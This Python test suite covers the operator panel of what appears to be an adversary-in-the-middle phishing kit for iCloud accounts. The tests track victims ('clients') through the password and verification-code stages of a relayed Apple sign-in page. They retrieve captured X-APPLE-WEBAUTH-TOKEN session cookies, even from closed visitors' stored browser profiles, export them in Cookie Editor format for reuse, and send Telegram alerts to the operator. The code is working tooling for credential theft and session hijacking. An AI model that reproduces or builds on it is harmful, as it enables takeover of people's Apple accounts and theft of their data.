"""The control room: the clients, the Telegram settings, the cookies.

The panel is called directly here - the same way the server calls it - so
that what is tested is the panel's own rules and not the plumbing around
them.
"""

import asyncio
import json
import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from fastapi import Request

import admin
import telegram as telegram_module

passed = 0
failed = 0


def check(name, cond, detail=None):
    global passed, failed
    if cond:
        passed += 1
        print(f"ok   {name}")
    else:
        failed += 1
        print(f"FAIL {name}", detail if detail is not None else "")


def endpoint(path, method="GET"):
    """The function behind one of the panel's routes.

    A path with a name in it - /admin/api/clients/{sid}/cookies - is
    matched against the path that was asked for.
    """
    import re
    for route in admin.ROUTER.routes:
        if method not in getattr(route, "methods", set()):
            continue
        pattern = getattr(route, "path", "")
        if pattern == path:
            return route.endpoint
        filled = re.sub(r"\{[^/}]+\}", "[^/]+", pattern)
        if re.fullmatch(filled, path):
            return route.endpoint
    raise KeyError(path)


def make_request(method="GET", path="/admin/api/clients", body=None, cookies=None):
    """A request the way the server hands one over."""
    payload = b"" if body is None else json.dumps(body).encode()
    sent = {"done": False}

    async def receive():
        if sent["done"]:
            return {"type": "http.disconnect"}
        sent["done"] = True
        return {"type": "http.request", "body": payload, "more_body": False}

    headers = []
    for name, value in (cookies or {}).items():
        headers.append((b"cookie", f"{name}={value}".encode()))

    scope = {"type": "http", "method": method, "path": path,
             "headers": headers, "query_string": b""}
    return Request(scope, receive)


def as_json(answer):
    """What the route answered, as data."""
    if isinstance(answer, dict):
        return answer
    try:
        return json.loads(bytes(answer.body).decode("utf-8"))
    except Exception:
        return {}


def status_of(answer):
    """The status a route answered with. A plain answer is a good one."""
    return getattr(answer, "status_code", 200)


async def main():
    # ---- the store -------------------------------------------------------
    scratch = Path(tempfile.mkdtemp())
    store = admin.Store(scratch / "admin.json")
    # The panel keeps its settings in the store of its own: the tests use a
    # scratch one, so they never touch the settings of a real run.
    admin.STORE = admin.Store(scratch / "panel.json")
    the_panel = admin.STORE

    check("a new store is empty",
          store.telegram() == {"token": "", "chat_id": "", "enabled": True},
          store.telegram())
    check("...and has no secret",
          store.token() == "", store.token())

    store.set_telegram("123456789:AAsecretsecretsecret", "42", True)
    again = admin.Store(scratch / "admin.json")
    check("the settings are kept", again.telegram()["chat_id"] == "42",
          again.telegram())
    check("...and so is the token",
          again.telegram()["token"] == "123456789:AAsecretsecretsecret",
          again.telegram())
    check("...and the file is a secret",
          oct((scratch / "admin.json").stat().st_mode)[-3:] == "600",
          oct((scratch / "admin.json").stat().st_mode))

    check("a token is masked before it is shown",
          admin.mask("123456789:AAsecretsecretsecret") == "1234••••••cret",
          admin.mask("123456789:AAsecretsecretsecret"))
    check("...and a short one is hidden altogether",
          admin.mask("abc") == "•••", admin.mask("abc"))

    # ---- the environment has the secret first ----------------------------
    os.environ["ICLOUD_ADMIN_TOKEN"] = "from-the-environment"
    check("the environment holds the secret",
          store.token() == "from-the-environment", store.token())
    os.environ.pop("ICLOUD_ADMIN_TOKEN")
    store.set_token("from-the-file")
    check("...and the file holds it when the environment does not",
          store.token() == "from-the-file", store.token())

    # ---- the cookies, in Cookie Editor's format --------------------------
    exported = admin.cookie_editor([
        {"domain": ".icloud.com", "name": "X-APPLE-WEBAUTH-TOKEN",
         "value": '"v=2:t=Bw=="', "path": "/", "httpOnly": True,
         "secure": True, "expires": None},
        {"domain": "www.icloud.com", "name": "a-cookie",
         "value": "1", "path": "/", "httpOnly": False,
         "secure": False, "expires": 1797975923.5},
    ])
    check("a cookie has the fields Cookie Editor expects",
          set(exported[0]) == {"domain", "hostOnly", "httpOnly", "name",
                               "path", "sameSite", "secure", "session",
                               "storeId", "value"},
          sorted(exported[0]))
    check("...and the ones that only sometimes are there",
          "expirationDate" not in exported[0] and
          exported[1]["expirationDate"] == 1797975923.5, exported)
    check("a cookie with no end is a session cookie",
          exported[0]["session"] is True, exported[0])
    check("a cookie with an end is not",
          exported[1]["session"] is False, exported[1])
    check("a domain with a dot is not host only",
          exported[0]["hostOnly"] is False and exported[1]["hostOnly"] is True,
          exported)

    # ---- the panel says no without the secret ---------------------------
    the_panel.set_token("the-secret")

    answer = await endpoint("/admin/api/clients")(make_request())
    check("the clients are for the admin only",
          status_of(answer) == 403, status_of(answer))
    answer = await endpoint("/admin/api/telegram")(make_request())
    check("...and so are the Telegram settings",
          status_of(answer) == 403, status_of(answer))
    answer = await endpoint("/admin/api/cookies")(make_request())
    check("...and so are the cookies",
          status_of(answer) == 403, status_of(answer))

    # ---- the admin gets in ----------------------------------------------
    answer = await endpoint("/admin/api/login", "POST")(
        make_request("POST", "/admin/api/login", {"token": "wrong"}))
    check("the wrong secret is refused",
          status_of(answer) == 403, status_of(answer))

    answer = await endpoint("/admin/api/login", "POST")(
        make_request("POST", "/admin/api/login", {"token": "the-secret"}))
    check("the right secret is let in",
          status_of(answer) == 200, status_of(answer))
    check("...and it is kept in a cookie of its own",
          "icloud_admin=the-secret" in answer.headers.get("set-cookie", ""),
          answer.headers.get("set-cookie"))

    admin_cookie = {"icloud_admin": "the-secret"}

    # ---- the clients -----------------------------------------------------
    import server
    session = server.session_for("the-admin-test")
    session.hub.page = "/src/4.html"
    session.state["browser_open"] = True
    session.hub.browser = {"url": "https://idmsa.apple.com/signin",
                           "title": "Sign in to your Apple Account",
                           "fields": {}}

    answer = await endpoint("/admin/api/clients")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    rows = [row for row in data.get("clients", [])
            if row["id"] == "the-admin-test"]
    check("the admin sees the clients the server has",
          len(rows) == 1, data.get("clients"))
    row = rows[0]
    check("...and where each one is",
          row["stage"] == "Password", row)
    check("...and what its browser is doing",
          row["browser_url"] == "https://idmsa.apple.com/signin", row)
    check("...and that it is active",
          row["browser_open"] is True, row)
    check("...and how long ago it was seen",
          isinstance(row["idle_seconds"], float), row)
    check("...and that its cookies are closed",
          row["export_allowed"] is False, row)

    # ---- the clients who are not here any more --------------------------
    # A visitor whose browser has been shut down is still a visitor. The
    # panel says they have gone, and where they got to - rather than
    # dropping them off the list and leaving the panel looking empty.
    server.GONE["the-admin-gone"] = {
        "page": "/src/2.html", "stage": "Verification code",
        "url": "https://idmsa.apple.com/signin", "finished": False,
        "seen": time.time() - 600,
    }
    answer = await endpoint("/admin/api/clients")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    gone = [row for row in data.get("clients", [])
            if row["id"] == "the-admin-gone"]
    check("a client who has gone is still listed",
          len(gone) == 1, data.get("clients"))
    check("...and says they have gone",
          gone[0]["status"] == "gone", gone)
    check("...and where they got to",
          gone[0]["stage"] == "Verification code", gone)
    check("...and that they are not here now",
          gone[0]["browser_open"] is False and gone[0]["known"] is False, gone)

    # A profile folder on disk is a client whose browser is shut down.
    # The folder is that visitor's browser memory - their cookies are in
    # it - so they are on the list, and the panel says they are offline.
    profile = server.PROFILES / "the-admin-before"
    profile.mkdir(parents=True, exist_ok=True)
    answer = await endpoint("/admin/api/clients")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    before = [row for row in data.get("clients", [])
              if row["id"] == "the-admin-before"]
    check("a client whose profile is on disk is on the list",
          len(before) == 1, data.get("clients"))
    check("...and is said to be offline",
          before[0]["online"] is False and
          before[0]["status"] == "offline", before)
    check("...and the panel knows where their profile is",
          before[0]["profile_path"].endswith("the-admin-before"), before)

    # And their cookies can be asked for - the folder holds them.
    answer = await endpoint("/admin/api/clients/{sid}/export", "POST")(
        "the-admin-before",
        make_request("POST", "/admin/api/clients/the-admin-before/export",
                     {"allowed": True}, cookies=admin_cookie))
    check("...so they can be allowed to be exported",
          status_of(answer) == 200, as_json(answer))

    answer = await endpoint("/admin/api/clients/{sid}/cookies")(
        "the-admin-before", make_request(cookies=admin_cookie))
    check("...and their cookies can be read",
          status_of(answer) == 200, as_json(answer))

    # A client the server has never heard of is not a client, whatever
    # the operator calls it.
    answer = await endpoint("/admin/api/clients/{sid}/export", "POST")(
        "no-such-client",
        make_request("POST", "/admin/api/clients/no-such-client/export",
                     {"allowed": True}, cookies=admin_cookie))
    check("a client that has never been here is not a client",
          status_of(answer) == 404, status_of(answer))

    # ---- the cookies of a client who has gone ----------------------------
    # Their browser is closed, but their cookies were read while it was
    # open - so the export still works, and still needs the permission.
    server.GONE["the-admin-gone"]["cookies"] = [
        {"domain": ".icloud.com", "name": "X-APPLE-WEBAUTH-TOKEN",
         "value": '"v=2:t=Bw=="', "path": "/", "httpOnly": True,
         "secure": True, "expires": None},
    ]
    answer = await endpoint("/admin/api/clients/{sid}/cookies")(
        "the-admin-gone", make_request(cookies=admin_cookie))
    check("a client who has gone has no cookies without the permission",
          status_of(answer) == 403, status_of(answer))

    answer = await endpoint("/admin/api/clients/{sid}/export", "POST")(
        "the-admin-gone",
        make_request("POST", "/admin/api/clients/the-admin-gone/export",
                     {"allowed": True}, cookies=admin_cookie))
    check("a client who has gone can be allowed to be exported",
          status_of(answer) == 200, as_json(answer))

    answer = await endpoint("/admin/api/clients/{sid}/cookies")(
        "the-admin-gone", make_request(cookies=admin_cookie))
    data = as_json(answer)
    check("...and then their cookies can be read",
          len(data.get("cookies", [])) == 1 and
          data["cookies"][0]["name"] == "X-APPLE-WEBAUTH-TOKEN", data)
    check("...in the format Cookie Editor reads",
          set(data["cookies"][0]) >= {"domain", "hostOnly", "httpOnly",
                                      "name", "path", "sameSite", "secure",
                                      "session", "storeId", "value"},
          sorted(data["cookies"][0]))

    # ---- the panel listens, it does not ask -----------------------------
    # The panel opens one line to the server and the server pushes to it.
    # A panel that asked the server the same question every two seconds
    # would be asking about something the server already knows.
    check("nobody is listening yet", len(admin.LISTENERS) == 0,
          admin.LISTENERS)

    class FakeListener:
        def __init__(self):
            self.sent = []
            self.secret = "the-secret"

        def put_nowait(self, message):
            self.sent.append(message)

        def close(self, code=1000):
            self.closed = code

    listener = FakeListener()
    admin.LISTENERS.add(listener)
    admin.push()
    check("the server pushes to the panel when something changes",
          len(listener.sent) == 1, listener.sent)
    check("...and what it pushes is the clients",
          "clients" in listener.sent[0], listener.sent[0])
    check("...and the events too",
          "events" in listener.sent[0], listener.sent[0])

    # A change is pushed without being asked for.
    before = len(listener.sent)
    admin.note("something-happened", session="the-admin-test")
    check("an event is pushed as well",
          len(listener.sent) > before, listener.sent)
    admin.LISTENERS.discard(listener)

    # A line whose secret is no longer the secret is closed.
    old = FakeListener()
    old.secret = "an-old-secret"
    admin.LISTENERS.add(old)
    admin.drop_stale_listeners()
    check("a line with an old secret is closed",
          len(admin.LISTENERS) == 0, admin.LISTENERS)
    check("...and it is closed with the code that says so",
          getattr(old, "closed", None) == 1008, getattr(old, "closed", None))

    # ---- the secret in the file is read again ----------------------------
    # The secret may be put in the file while the server is running.
    late = admin.Store(scratch / "late.json")
    check("a store with no secret has none",
          late.token() == "", late.token())
    (scratch / "late.json").write_text(
        json.dumps({"admin_token": "written-later"}), encoding="utf-8")
    import os as _os
    stamp = _os.stat(scratch / "late.json").st_mtime
    _os.utime(scratch / "late.json", (stamp + 10, stamp + 10))
    check("...and the file is read again when it changes",
          late.token() == "written-later", late.token())

    # ---- who is here, and who is not ------------------------------------
    # A client with somebody looking at the capture right now is here. A
    # client whose browser is open but whose page has been closed is not.
    check("a client with nobody looking at it is not here",
          row["here"] is False, row)
    check("...and the panel is told how many are looking",
          isinstance(row["viewers"], int), row)

    class FakeViewer:
        def send(self, message): pass
        def close(self): pass

    viewer = FakeViewer()
    session.hub.join(viewer)
    answer = await endpoint("/admin/api/clients")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    row = [r for r in data["clients"] if r["id"] == "the-admin-test"][0]
    check("a client somebody is looking at is here now",
          row["here"] is True and row["viewers"] == 1, row)
    session.hub.leave(viewer)

    answer = await endpoint("/admin/api/clients")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    row = [r for r in data["clients"] if r["id"] == "the-admin-test"][0]
    check("...and stops being here when they look away",
          row["here"] is False and row["viewers"] == 0, row)

    # ---- the Telegram settings -------------------------------------------
    the_panel.set_telegram("123456789:AAsecretsecretsecret", "42", True)
    answer = await endpoint("/admin/api/telegram")(
        make_request(cookies=admin_cookie))
    data = as_json(answer)
    check("the Telegram token is never sent back to the page",
          "token" not in data and data.get("token_set") is True, data)
    check("...only the ends of it",
          "••••••" in data.get("token_masked", ""), data)

    answer = await endpoint("/admin/api/telegram", "POST")(
        make_request("POST", "/admin/api/telegram",
                     {"token": "999:BBnewtoken", "chat_id": "77",
                      "enabled": False},
                     cookies=admin_cookie))
    data = as_json(answer)
    check("the Telegram settings are saved",
          data.get("chat_id") == "77" and data.get("enabled") is False, data)
    check("...and the token is kept",
          admin.STORE.telegram()["token"] == "999:BBnewtoken",
          admin.STORE.telegram())

    # A token that is not typed in again is not lost.
    answer = await endpoint("/admin/api/telegram", "POST")(
        make_request("POST", "/admin/api/telegram", {"chat_id": "78"},
                     cookies=admin_cookie))
    data = as_json(answer)
    check("a token that is not typed in again is not lost",
          admin.STORE.telegram()["token"] == "999:BBnewtoken",
          admin.STORE.telegram())
    check("...and the chat id is changed",
          admin.STORE.telegram()["chat_id"] == "78", admin.STORE.telegram())

    # ---- the cookies -----------------------------------------------------
    class FakeContext:
        def __init__(self):
            self.sent = []

        async def cookies(self):
            self.sent.append(1)
            return [{"domain": ".icloud.com", "name": "X-APPLE-WEBAUTH-TOKEN",
                     "value": '"v=2:t=Bw=="', "path": "/", "httpOnly": True,
                     "secure": True, "expires": None}]

    session.ctx = FakeContext()

    answer = await endpoint("/admin/api/cookies")(
        make_request(cookies={**admin_cookie,
                              "icloud_session": "the-admin-test"}))
    data = as_json(answer)
    check("a session can export its own cookies",
          status_of(answer) == 200 and data.get("session") == "the-admin-test",
          (status_of(answer), data))
    check("...in the format Cookie Editor reads",
          data["cookies"][0]["name"] == "X-APPLE-WEBAUTH-TOKEN", data)

    # Another session's cookies are not the admin's own.
    answer = await endpoint("/admin/api/clients/{sid}/cookies")(
        "the-admin-test", make_request(cookies=admin_cookie))
    check("a session that has not been allowed is not exported",
          status_of(answer) == 403, status_of(answer))

    answer = await endpoint("/admin/api/clients/{sid}/export", "POST")(
        "the-admin-test",
        make_request("POST", "/admin/api/clients/the-admin-test/export",
                     {"allowed": True}, cookies=admin_cookie))
    data = as_json(answer)
    check("a session can be allowed to be exported",
          data.get("export_allowed") is True, data)

    answer = await endpoint("/admin/api/clients/{sid}/cookies")(
        "the-admin-test", make_request(cookies=admin_cookie))
    data = as_json(answer)
    check("...and then it can",
          status_of(answer) == 200 and data["cookies"], (status_of(answer), data))

    answer = await endpoint("/admin/api/clients/{sid}/export", "POST")(
        "the-admin-test",
        make_request("POST", "/admin/api/clients/the-admin-test/export",
                     {"allowed": False}, cookies=admin_cookie))
    check("...and the permission can be taken away again",
          as_json(answer).get("export_allowed") is False, as_json(answer))

    # ---- the Telegram message --------------------------------------------
    check("a message without a token is not sent",
          (await telegram_module.send("", "42", "hello"))[0] is False)
    check("...and says why",
          "missing" in (await telegram_module.send("", "42", "hello"))[1])

    sent = []

    class FakeAnswer:
        def __init__(self, body):
            self.body = body

        def read(self):
            return self.body

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

    def fake_urlopen(request, timeout=None):
        sent.append((request.full_url, request.data))
        return FakeAnswer(b'{"ok": true}')

    import urllib.request
    original = urllib.request.urlopen
    urllib.request.urlopen = fake_urlopen
    try:
        went, said = await telegram_module.send("token:abc", "42", "hello")
    finally:
        urllib.request.urlopen = original
    check("a message with a token is sent",
          went is True and len(sent) == 1, (went, said))
    check("...to the bot that owns it",
          sent[0][0].startswith("https://api.telegram.org/bottoken:abc/sendMessage"),
          sent[0][0])
    check("...with the chat it was told to",
          json.loads(sent[0][1].decode())["chat_id"] == "42",
          sent[0][1])

    # The notification for the new client is sent in the background: let it
    # finish, so that nothing is left running when the suite ends.
    await asyncio.sleep(0.3)

    print(f"\n{passed} passed, {failed} failed")
    return 1 if failed else 0


sys.exit(asyncio.run(main()))
